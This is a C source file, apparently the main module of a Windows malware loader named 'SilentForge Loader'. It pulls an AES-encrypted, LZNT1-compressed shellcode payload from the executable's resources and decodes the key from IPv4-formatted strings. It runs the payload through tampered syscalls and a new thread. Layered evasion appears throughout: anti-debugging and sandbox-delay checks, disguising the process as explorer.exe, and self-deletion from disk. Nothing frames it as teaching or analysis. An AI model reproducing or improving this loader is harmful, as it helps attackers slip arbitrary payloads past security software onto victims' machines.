#include <windows.h>
#include "Config.h"
#include "Structs.h"
#include "AntiDebug.h"
#include "PebMasquerade.h"
#include "ApiResolve.h"
#include "TamperedSyscalls.h"
#include "AesCrypt.h"
#include "HellShellDecode.h"
#include "Decompress.h"
#include "SelfDestruct.h"

#include "PayloadKey.h"
#include "PayloadInfo.h"
#include "Resource.h"

static BOOL ExtractResourcePayload(BYTE** ppData, DWORD* pdwSize) {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_PAYLOAD_BIN), MAKEINTRESOURCEA(RT_PAYLOAD));
    if (!hRes) { DBG_FAIL("FindResourceA failed (err=%lu)", GetLastError()); return FALSE; }

    HGLOBAL hGlob = LoadResource(NULL, hRes);
    if (!hGlob) { DBG_FAIL("LoadResource failed"); return FALSE; }

    DWORD dwSize = SizeofResource(NULL, hRes);
    PVOID pData  = LockResource(hGlob);
    if (!pData || dwSize == 0) { DBG_FAIL("LockResource failed or size=0"); return FALSE; }

    BYTE* pCopy = (BYTE*)HeapAlloc(GetProcessHeap(), 0, dwSize);
    if (!pCopy) { DBG_FAIL("HeapAlloc for resource copy failed"); return FALSE; }

    memcpy(pCopy, pData, dwSize);
    *ppData  = pCopy;
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL ExecuteShellcode(BYTE* pShellcode, DWORD dwSize) {
    NTSTATUS status;
    PVOID    pBase      = NULL;
    SIZE_T   szRegion   = (SIZE_T)dwSize;
    ULONG    ulOldProt  = 0;
    HANDLE   hThread    = NULL;

    DBG_STEP("NtAllocateVirtualMemory (RW, %lu bytes)...", (unsigned long)dwSize);
    status = TamperedNtAllocateVirtualMemory(
        (HANDLE)-1, &pBase, 0, &szRegion,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!NT_SUCCESS(status) || !pBase) {
        DBG_FAIL("NtAllocateVirtualMemory failed: 0x%08X", (unsigned int)status);
        return FALSE;
    }
    DBG_OK("Allocated RW memory at 0x%p (%llu bytes)", pBase, (unsigned long long)szRegion);

    DBG_STEP("Copying shellcode to allocated memory...");
    for (DWORD i = 0; i < dwSize; i++)
        ((volatile BYTE*)pBase)[i] = pShellcode[i];
    DBG_OK("Shellcode copied");

    DBG_STEP("NtProtectVirtualMemory (RW -> RX)...");
    status = TamperedNtProtectVirtualMemory(
        (HANDLE)-1, &pBase, &szRegion,
        PAGE_EXECUTE_READ, &ulOldProt
    );
    if (!NT_SUCCESS(status)) {
        DBG_FAIL("NtProtectVirtualMemory failed: 0x%08X", (unsigned int)status);
        goto cleanup;
    }
    DBG_OK("Memory protection changed to RX (old=0x%X)", ulOldProt);

    DBG_STEP("Zeroing plaintext shellcode from heap...");
    SecureZeroMemory(pShellcode, dwSize);

    DBG_STEP("NtCreateThreadEx (start=0x%p)...", pBase);
    status = TamperedNtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL,
        (HANDLE)-1, pBase, NULL,
        0, 0, 0, 0, NULL
    );
    if (!NT_SUCCESS(status)) {
        DBG_FAIL("NtCreateThreadEx failed: 0x%08X", (unsigned int)status);
        goto cleanup;
    }
    DBG_OK("Thread created (handle=0x%p)", hThread);

#if ENABLE_SELF_DESTRUCT
    SelfDestructFromDisk();
#endif

    DBG_STEP("Waiting for shellcode thread to complete...");
    TamperedNtWaitForSingleObject(hThread, FALSE, NULL);
    DBG_OK("Shellcode thread returned");

    CloseHandle(hThread);
    return TRUE;

cleanup:
    if (pBase) {
        SIZE_T szFree = 0;
        TamperedNtFreeVirtualMemory((HANDLE)-1, &pBase, &szFree, MEM_RELEASE);
    }
    return FALSE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

#if ENABLE_DEBUG_OUTPUT
    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    printf("\n");
    printf("  ============================================\n");
    printf("  =          SilentForge Loader              =\n");
    printf("  =       DEBUG OUTPUT ENABLED               =\n");
    printf("  ============================================\n\n");
    printf("  Payload encrypted size : %lu bytes\n", (unsigned long)PAYLOAD_ENCRYPTED_SIZE);
    printf("  Payload original size  : %lu bytes\n\n", (unsigned long)PAYLOAD_ORIGINAL_SIZE);
#endif

    /* Layer 4: Anti-debug gate + Layer 5: Sandbox delay */
#if ENABLE_ANTI_DEBUG || ENABLE_SANDBOX_DELAY
    DBG_STEP("Running anti-debug checks...");
    if (!RunAntiDebugChecks()) {
        DBG_FAIL("Anti-debug check FAILED -- exiting");
#if ENABLE_DEBUG_OUTPUT
        printf("\n[!] Press Enter to exit...\n");
        getchar();
#endif
        return 0;
    }
    DBG_OK("Anti-debug checks passed");
#else
    DBG("Anti-debug DISABLED");
#endif

    /* Layer 6: PEB masquerade */
#if ENABLE_PEB_MASQUERADE
    DBG_STEP("Masquerading PEB as explorer.exe...");
    if (MasqueradePebAsExplorer())
        DBG_OK("PEB masquerade complete");
    else
        DBG_FAIL("PEB masquerade failed (non-fatal)");
#endif

    /* Layer 8: Initialize tampered syscalls engine */
#if ENABLE_TAMPERED_SYSCALLS
    DBG_STEP("Initializing tampered syscalls engine...");
    if (!InitTamperedSyscalls()) {
        DBG_FAIL("Tampered syscalls init FAILED -- exiting");
#if ENABLE_DEBUG_OUTPUT
        printf("\n[!] Press Enter to exit...\n");
        getchar();
#endif
        return 0;
    }
    DBG_OK("Tampered syscalls engine ready (VEH installed, HW-BP target found)");
#else
    DBG("Tampered syscalls DISABLED");
#endif

    /* Layer 3: Decode AES key from HellShell IPv4 format */
    BYTE aesKey[AES_KEY_SIZE] = { 0 };
    BYTE aesIv[AES_IV_SIZE]   = { 0 };

#if ENABLE_HELLSHELL_KEY
    DBG_STEP("Decoding AES key from HellShell IPv4 format (%d addresses)...", 12);
    if (!HellShellDecodeIpv4(g_Ipv4KeyIv, 12, aesKey, aesIv)) {
        DBG_FAIL("HellShell key decode FAILED");
        goto exit_clean;
    }
    DBG_OK("AES key+IV decoded (key[0..3]: %02X %02X %02X %02X...)",
           aesKey[0], aesKey[1], aesKey[2], aesKey[3]);
#endif

    /* Extract encrypted payload from resource section */
    BYTE* pEncPayload    = NULL;
    DWORD dwEncPayloadSz = 0;

    DBG_STEP("Extracting encrypted payload from PE resource section...");
    if (!ExtractResourcePayload(&pEncPayload, &dwEncPayloadSz)) {
        DBG_FAIL("Resource extraction FAILED");
        goto exit_clean;
    }
    DBG_OK("Extracted %lu bytes from resource", (unsigned long)dwEncPayloadSz);

    /* Layer 2: AES-256-CBC decrypt */
    BYTE* pDecrypted    = NULL;
    DWORD dwDecryptedSz = 0;

#if ENABLE_AES_ENCRYPTION
    DBG_STEP("AES-256-CBC decrypting (%lu bytes)...", (unsigned long)dwEncPayloadSz);
    if (!AesDecryptPayload(aesKey, aesIv, pEncPayload,
                           dwEncPayloadSz, &pDecrypted, &dwDecryptedSz)) {
        DBG_FAIL("AES decryption FAILED");
        HeapFree(GetProcessHeap(), 0, pEncPayload);
        goto exit_clean;
    }
    DBG_OK("Decrypted %lu -> %lu bytes", (unsigned long)dwEncPayloadSz, (unsigned long)dwDecryptedSz);
    SecureZeroMemory(pEncPayload, dwEncPayloadSz);
    HeapFree(GetProcessHeap(), 0, pEncPayload);
#endif

    SecureZeroMemory(aesKey, sizeof(aesKey));
    SecureZeroMemory(aesIv, sizeof(aesIv));

    /* Layer 1: LZNT1 decompress */
    BYTE* pShellcode    = NULL;
    DWORD dwShellcodeSz = 0;

#if ENABLE_LZNT1_COMPRESS
    DBG_STEP("LZNT1 decompressing (%lu -> %lu expected)...",
             (unsigned long)dwDecryptedSz, (unsigned long)PAYLOAD_ORIGINAL_SIZE);
    if (!DecompressPayload(pDecrypted, dwDecryptedSz, PAYLOAD_ORIGINAL_SIZE,
                           &pShellcode, &dwShellcodeSz)) {
        DBG_FAIL("LZNT1 decompression FAILED");
        goto exit_clean;
    }
    DBG_OK("Decompressed to %lu bytes (expected %lu)",
           (unsigned long)dwShellcodeSz, (unsigned long)PAYLOAD_ORIGINAL_SIZE);

    SecureZeroMemory(pDecrypted, dwDecryptedSz);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    pDecrypted = NULL;
#else
    pShellcode    = pDecrypted;
    dwShellcodeSz = dwDecryptedSz;
    pDecrypted    = NULL;
    DBG("LZNT1 compression DISABLED, using decrypted buffer directly");
#endif

    /* Layers 8-10: Execute via tampered syscalls */
    DBG_STEP("Executing shellcode (%lu bytes)...", (unsigned long)dwShellcodeSz);
    DBG("  First 16 bytes: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
        pShellcode[0], pShellcode[1], pShellcode[2], pShellcode[3],
        pShellcode[4], pShellcode[5], pShellcode[6], pShellcode[7],
        pShellcode[8], pShellcode[9], pShellcode[10], pShellcode[11],
        pShellcode[12], pShellcode[13], pShellcode[14], pShellcode[15]);

    BOOL bExecResult = ExecuteShellcode(pShellcode, dwShellcodeSz);
    if (bExecResult)
        DBG_OK("Shellcode execution completed successfully");
    else
        DBG_FAIL("Shellcode execution FAILED");

    HeapFree(GetProcessHeap(), 0, pShellcode);

exit_clean:
    if (pDecrypted) {
        SecureZeroMemory(pDecrypted, dwDecryptedSz);
        HeapFree(GetProcessHeap(), 0, pDecrypted);
    }

#if ENABLE_TAMPERED_SYSCALLS
    CleanupTamperedSyscalls();
#endif

#if ENABLE_DEBUG_OUTPUT
    printf("\n[*] Loader finished. Press Enter to exit...\n");
    getchar();
#endif

    return 0;
}
